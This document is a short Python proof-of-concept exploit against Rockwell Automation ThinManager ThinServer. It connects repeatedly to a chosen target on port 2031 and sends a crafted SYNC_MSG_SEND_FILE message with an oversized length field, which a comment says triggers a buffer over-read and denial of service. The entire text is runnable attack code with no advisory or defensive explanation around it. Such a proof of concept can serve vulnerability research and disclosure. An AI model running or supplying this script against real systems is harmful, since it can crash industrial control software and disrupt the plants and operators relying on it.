import socket, argparse, hexdump, time
from struct import *

def dump(title, data):
  print('[-- %s --]' % (title))
  if data: hexdump.hexdump(data)

def mk_msg(type, flags, data, dlen=None):
  if dlen == None:
    dlen = len(data)
  hdr = pack('>HHL', type, flags, dlen);
  msg = hdr + data
  return msg


#
# MAIN
#
descr = 'Rockwell Automation ThinManager ThinServer SYNC_MSG_SEND_FILE DoS'

parser = argparse.ArgumentParser(description=descr, formatter_class=argparse.RawTextHelpFormatter)
required = parser.add_argument_group('required arguments')
required.add_argument('-t', '--target',required=True, help='target host')
parser.add_argument('-p', '--port', type=int, default=2031, help='ThinServer.exe port, default: %(default)s')

args = parser.parse_args()
target = args.target
port = args.port

for i in range(1,100):
  print('Connection {}'.format(i))
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target, port))
  s.settimeout(5)

  req = pack('<L', 0x100);
  #dump('req', req)
  s.sendall(req)
  res = s.recv(4096)
  #dump('res', res)

  data  = pack('>L', 0xaa)
  data += b'file_name\x00'
  data += b'file_type\x00'
  data += b'unk_str1\x00'
  data += pack('>L', 0xffffffff) # -> Buffer over-read
  data += b'A'* 16 
   
  req = mk_msg(7, 0x0001, data)
  s.sendall(req)
  time.sleep(1)
  s.close()
